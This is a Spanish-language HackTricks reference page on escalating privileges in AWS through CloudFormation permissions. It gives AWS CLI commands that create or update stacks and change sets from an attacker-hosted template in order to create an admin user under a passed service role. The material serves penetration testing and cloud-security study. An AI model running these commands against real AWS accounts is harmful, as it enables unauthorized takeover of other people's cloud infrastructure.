# AWS - Cloudformation Privesc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## cloudformation

Para obtener m√°s informaci√≥n sobre cloudformation, consulte:

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

Un atacante con los permisos **`iam:PassRole`** y **`cloudformation:CreateStack`** podr√≠a **escalar privilegios creando una plantilla de CloudFormation** que realizar√° acciones y crear√° recursos utilizando los **permisos del rol que se pas√≥** al crear una pila de CloudFormation.

```bash
aws cloudformation create-stack --stack-name my_stack \
    --template-url http://my-website.com/my-malicious-template.template \
    --role-arn arn_of_cloudformation_service_role
```

Donde la plantilla ubicada en el sitio web del atacante incluye instrucciones para realizar **acciones maliciosas, como crear un usuario administrador** y luego usar esas credenciales para escalar su propio acceso.

En la siguiente p√°gina, tiene un **ejemplo de explotaci√≥n** con el permiso adicional **`cloudformation:DescribeStacks`**:

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**Impacto potencial:** Privesc al rol de servicio de cloudformation especificado.

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

En este caso, puede **abusar de una pila de cloudformation existente** para actualizarla y escalar privilegios como en el escenario anterior:

```bash
aws cloudformation update-stack \
    --stack-name privesc \
    --template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
    --role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
    --capabilities CAPABILITY_IAM \
    --region eu-west-1 
```

El permiso `cloudformation:SetStackPolicy` se puede usar para **darte permiso de `UpdateStack`** sobre una pila y realizar el ataque.

**Impacto potencial:** Privesc al rol de servicio de cloudformation especificado.

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

Si tiene este permiso pero **no `iam:PassRole`**, a√∫n puede **actualizar las pilas** utilizadas y abusar de los **roles de IAM que ya tienen adjuntos**. Consulte la secci√≥n anterior para obtener un ejemplo de explotaci√≥n (simplemente no indique ning√∫n rol en la actualizaci√≥n).

El permiso `cloudformation:SetStackPolicy` se puede usar para **darte permiso de `UpdateStack`** sobre una pila y realizar el ataque.

**Impacto potencial:** Privesc al rol de servicio de cloudformation ya adjunto.

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

Un atacante con permisos para **pasar un rol y crear y ejecutar un ChangeSet** puede **crear/actualizar una nueva pila de cloudformation y abusar de los roles de servicio de cloudformation** como con CreateStack o UpdateStack.

El siguiente exploit es una **variaci√≥n del** [**CreateStack**](./#iam-passrole-cloudformation-createstack) **usando los permisos de ChangeSet** para crear una pila.

```bash
aws cloudformation create-change-set \
    --stack-name privesc \
    --change-set-name privesc \
    --change-set-type CREATE \
    --template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
    --role arn:aws:iam::947247140022:role/CloudFormationAdmin \
    --capabilities CAPABILITY_IAM \
    --region eu-west-1

echo "Esperando 2 minutos para cambiar la pila"
sleep 120

aws cloudformation execute-change-set \
    --change-set-name privesc \
    --stack-name privesc \
    --region eu-west-1

echo "Esperando 2 minutos para ejecutar la pila"
sleep 120

aws cloudformation describe-stacks \
    --stack-name privesc \
    --region eu-west-1
```

El permiso `cloudformation:SetStackPolicy` se puede usar para **darte permiso de `ChangeSet`** sobre una pila y realizar el ataque.

**Impacto potencial:** Privesc a los roles de servicio de cloudformation.

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

Esto es como el m√©todo anterior sin pasar **roles de IAM**, por lo que solo puede **abusar de los ya adjuntos**, solo modifique el par√°metro:

```
--change-set-type UPDATE
```

**Impacto potencial:** Privesc al rol de servicio de cloudformation ya adjunto.

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

Un atacante podr√≠a abusar de estos permisos para crear/actualizar StackSets y abusar de roles de cloudformation arbitrarios.

**Impacto potencial:** Privesc a los roles de servicio de cloudformation.

### `cloudformation:UpdateStackSet`

Un atacante podr√≠a abusar de este permiso sin el permiso de passRole para actualizar StackSets y abusar de los roles de cloudformation adjuntos.

**Impacto potencial:** Privesc a los roles de cloudformation adjuntos.

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>